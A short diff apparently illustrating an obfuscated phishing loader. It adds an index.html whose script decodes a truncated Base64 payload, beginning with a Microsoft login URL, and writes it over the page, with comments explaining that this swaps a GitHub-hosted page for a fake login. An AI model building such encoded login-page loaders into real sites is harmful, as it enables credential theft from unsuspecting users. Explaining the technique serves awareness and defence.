@@ -1,0 +1,13 @@
+index.html
+<script>
+  // A giant block of "Base64" (scrambled code)
+  var payload = "aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29t..."; 
+
+  // The "Unpacker" script
+  function unpack(data) {
+    var decoded = atob(data); // Turns scrambled text back into a webpage
+    document.write(decoded);  // Instantly replaces the GitHub page with the fake login
+  }
+  
+  unpack(payload);
+</script>
